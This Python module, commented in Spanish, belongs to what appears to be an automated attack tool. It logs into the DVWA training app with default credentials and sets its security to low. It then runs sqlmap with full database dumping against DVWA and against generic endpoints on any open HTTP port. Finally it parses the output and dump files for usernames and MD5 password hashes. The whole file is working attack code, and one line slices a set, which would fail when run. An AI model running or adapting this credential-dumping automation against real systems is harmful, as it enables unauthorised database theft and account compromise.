import subprocess
import re
import requests
from pathlib import Path
from config import Config
from models.host import Host
from models.vuln import Vulnerability, RiskLevel
from rich import print as rprint


class SQLMapInjector:
    def __init__(self, host: Host):
        self.host = host
        self.sql_dir = Path(f"{Config.OUTPUT_BASE}/sqlmap")
        self.sql_dir.mkdir(parents=True, exist_ok=True)

    def _get_dvwa_cookie(self):
        """Login en DVWA y obtener cookie de sesión"""
        try:
            session = requests.Session()
            login_url = f"http://{self.host.ip}{Config.DVWA_LOGIN_URL}"

            resp = session.get(login_url, timeout=10)
            token_match = re.search(r"user_token'\s+value='([^']+)'", resp.text)
            token = token_match.group(1) if token_match else ''

            data = {
                'username': Config.DVWA_DEFAULT_USER,
                'password': Config.DVWA_DEFAULT_PASS,
                'Login': 'Login',
                'user_token': token
            }
            session.post(login_url, data=data, timeout=10)

            session.post(f"http://{self.host.ip}/dvwa/security.php",
                         data={'security': 'low', 'seclev_submit': 'Submit'},
                         timeout=10)

            cookies = session.cookies.get_dict()
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            if 'PHPSESSID' in cookies:
                rprint(f"   [green]🔑 Login DVWA OK (PHPSESSID={cookies['PHPSESSID'][:8]}...)[/green]")
                return cookie_str + '; security=low'
            return None
        except Exception as e:
            rprint(f"   [yellow]⚠️ Login DVWA fallido: {e}[/yellow]")
            return None

    def _parse_credentials_from_stdout(self, stdout_text):
        """Extraer credenciales directamente del stdout de SQLMap"""
        creds = []

        # Patrón 1: Tabla SQLMap con | user | password/hash |
        # SQLMap muestra tablas así:
        # +----+----------+----------------------------------+
        # | .. | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
        # +----+----------+----------------------------------+
        rows = re.findall(
            r'\|\s*(?:\d+\s*\|)?\s*(\w+)\s*\|\s*([a-fA-F0-9]{32})\s*\|',
            stdout_text
        )
        for user, hash_val in rows:
            if user.lower() not in ['user', 'username', 'field', 'first_name', 'last_name', 'avatar']:
                creds.append({
                    'source': 'SQLMap (DVWA)',
                    'user': user,
                    'password': hash_val,
                    'hash': hash_val,
                    'cracked': False
                })

        # Patrón 2: user, password columns en formato CSV inline
        # [INFO] fetched data logged to text files under '/output/...'
        # Table: users
        # [5 entries]
        csv_rows = re.findall(
            r'(?:admin|user\d*|[a-zA-Z]+)\s*,\s*[a-fA-F0-9]{32}',
            stdout_text
        )
        for row in csv_rows:
            parts = row.split(',')
            if len(parts) >= 2:
                user = parts[0].strip()
                hash_val = parts[1].strip()
                if user.lower() not in ['user', 'username'] and not any(c['user'] == user for c in creds):
                    creds.append({
                        'source': 'SQLMap (DVWA)',
                        'user': user,
                        'password': hash_val,
                        'hash': hash_val,
                        'cracked': False
                    })

        # Patrón 3: SQLMap a veces muestra "password hash: MD5..."
        pass_matches = re.findall(
            r"'(\w+)'\s*:\s*'([a-fA-F0-9]{32})'",
            stdout_text
        )
        for user, hash_val in pass_matches:
            if not any(c['user'] == user for c in creds):
                creds.append({
                    'source': 'SQLMap (DVWA)',
                    'user': user,
                    'password': hash_val,
                    'hash': hash_val,
                    'cracked': False
                })

        # Patrón 4: Buscar en las líneas que contienen "admin" seguido de un hash
        for line in stdout_text.split('\n'):
            match = re.search(r'(?:^|\|)\s*(admin\w*)\s*(?:\|.*?\|)?\s*([a-fA-F0-9]{32})', line)
            if match and not any(c['user'] == match.group(1) and c['hash'] == match.group(2) for c in creds):
                creds.append({
                    'source': 'SQLMap (DVWA)',
                    'user': match.group(1),
                    'password': match.group(2),
                    'hash': match.group(2),
                    'cracked': False
                })

        return creds

    def _parse_credentials_from_files(self, output_dir):
        """Buscar credenciales en archivos de dump de SQLMap"""
        creds = []

        # SQLMap guarda en: output_dir/TARGET_IP/dump/DATABASE/TABLE.csv
        # También puede estar directamente en output_dir/dump/...
        search_paths = [
            output_dir,
            output_dir / self.host.ip,
            output_dir / f"dump",
        ]

        for base in search_paths:
            if not base.exists():
                continue

            # Buscar CSVs
            for csv_file in base.rglob("*.csv"):
                try:
                    content = csv_file.read_text(errors='ignore')
                    lines = content.strip().split('\n')
                    if len(lines) < 2:
                        continue

                    # Detectar columnas de usuario/password
                    header = lines[0].lower()
                    has_user = any(col in header for col in ['user', 'login', 'username', 'name'])
                    has_pass = any(col in header for col in ['pass', 'hash', 'password'])

                    if has_user or has_pass:
                        for line in lines[1:]:
                            parts = [p.strip() for p in line.split(',')]
                            if len(parts) >= 2:
                                # Buscar el campo que parece un hash MD5
                                user_val = parts[0]
                                hash_val = ''
                                for p in parts[1:]:
                                    if re.match(r'^[a-fA-F0-9]{32}$', p):
                                        hash_val = p
                                        break
                                if not hash_val and len(parts) > 1:
                                    hash_val = parts[1]

                                if user_val and user_val.lower() not in ['user', 'username', 'first_name']:
                                    if not any(c['user'] == user_val for c in creds):
                                        creds.append({
                                            'source': 'SQLMap (DVWA)',
                                            'user': user_val,
                                            'password': hash_val,
                                            'hash': hash_val,
                                            'cracked': False
                                        })
                except Exception:
                    pass

            # Buscar en archivos de log
            for log_file in base.rglob("log"):
                try:
                    content = log_file.read_text(errors='ignore')
                    stdout_creds = self._parse_credentials_from_stdout(content)
                    for c in stdout_creds:
                        if not any(x['user'] == c['user'] for x in creds):
                            creds.append(c)
                except Exception:
                    pass

            # Buscar en archivos .txt de dump
            for txt_file in base.rglob("*.txt"):
                try:
                    content = txt_file.read_text(errors='ignore')
                    if 'admin' in content.lower() and re.search(r'[a-fA-F0-9]{32}', content):
                        stdout_creds = self._parse_credentials_from_stdout(content)
                        for c in stdout_creds:
                            if not any(x['user'] == c['user'] for x in creds):
                                creds.append(c)
                except Exception:
                    pass

        return creds

    def attack(self):
        vulns = []
        rprint("   [cyan]💉 SQLMap contra DVWA...[/cyan]")

        # 1. Login automático en DVWA
        cookie = self._get_dvwa_cookie()

        for port, service in list(self.host.ports_open.items())[:3]:
            if 'http' not in service['service'].lower():
                continue

            output_dir = self.sql_dir / f"sql_{self.host.ip}_{port}"
            output_dir.mkdir(exist_ok=True)

            # ATAQUE PRINCIPAL: DVWA SQLi con cookie
            if cookie:
                dvwa_url = f"http://{self.host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
                rprint(f"   [red]🎯 SQLMap DVWA: {dvwa_url}[/red]")

                cmd = [
                    'sqlmap', '-u', dvwa_url,
                    '--cookie', cookie,
                    '--batch', '--risk=2', '--level=2',
                    '--dump', '--threads=3',
                    f'--output-dir={output_dir}'
                ]

                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    stdout = result.stdout

                    if 'injectable' in stdout.lower() or 'dumped' in stdout.lower() or 'entries' in stdout.lower():
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION + DUMP CREDENCIALES",
                            description=f"SQLi en DVWA: {dvwa_url} → Volcado de BD completo",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(output_dir),
                            recommendations="Usar prepared statements, validar inputs, WAF"
                        )
                        vulns.append(vuln)
                        rprint(f"   [bold red]💥 SQLi CRÍTICO + DUMP EXITOSO![/bold red]")

                        # EXTRAER CREDENCIALES del stdout
                        creds = self._parse_credentials_from_stdout(stdout)

                        # EXTRAER CREDENCIALES de archivos de dump
                        file_creds = self._parse_credentials_from_files(output_dir)
                        for fc in file_creds:
                            if not any(c['user'] == fc['user'] for c in creds):
                                creds.append(fc)

                        if creds:
                            self.host.credentials.extend(creds)
                            rprint(f"   [bold green]🔑 {len(creds)} credenciales extraídas![/bold green]")
                            for c in creds:
                                rprint(f"      [green]👤 {c['user']} : {c['password']}[/green]")
                        else:
                            # Guardar stdout para debug
                            debug_file = output_dir / "sqlmap_stdout.txt"
                            debug_file.write_text(stdout, errors='ignore')
                            rprint(f"   [yellow]⚠️ Dump OK pero no se parsearon credenciales[/yellow]")
                            rprint(f"   [yellow]   Revisa: {debug_file}[/yellow]")

                            # Intentar buscar cualquier hash MD5 en el stdout
                            all_hashes = re.findall(r'([a-fA-F0-9]{32})', stdout)
                            if all_hashes:
                                rprint(f"   [cyan]🔍 Hashes MD5 encontrados en stdout: {len(all_hashes)}[/cyan]")
                                for h in set(all_hashes)[:5]:
                                    rprint(f"      [cyan]#{h}[/cyan]")
                                    self.host.credentials.append({
                                        'source': 'SQLMap (raw)',
                                        'user': 'unknown',
                                        'password': h,
                                        'hash': h,
                                        'cracked': False
                                    })

                except subprocess.TimeoutExpired:
                    rprint(f"   [yellow]⏰ SQLMap timeout (300s)[/yellow]")
                except Exception as e:
                    rprint(f"   [yellow]⚠️ Error SQLMap: {e}[/yellow]")

            # FALLBACK: endpoints genéricos
            for endpoint in Config.SQL_ENDPOINTS:
                url = f"http://{self.host.ip}:{port}{endpoint}"
                fb_output = output_dir / "generic"
                fb_output.mkdir(exist_ok=True)

                cmd = [
                    'sqlmap', '-u', url,
                    '--batch', '--risk=2', '--level=2',
                    '--dump', '--threads=3',
                    f'--output-dir={fb_output}'
                ]

                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    if 'injectable' in result.stdout.lower():
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION CONFIRMADA",
                            description=f"SQLi en: {url}",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(fb_output),
                            recommendations="Prepared Statements, WAF"
                        )
                        vulns.append(vuln)
                        rprint(f"   [bold red]💥 SQLi CRÍTICO en {endpoint}![/bold red]")

                        creds = self._parse_credentials_from_stdout(result.stdout)
                        file_creds = self._parse_credentials_from_files(fb_output)
                        for fc in file_creds:
                            if not any(c['user'] == fc['user'] for c in creds):
                                creds.append(fc)
                        if creds:
                            self.host.credentials.extend(creds)
                except Exception:
                    pass

        return vulns
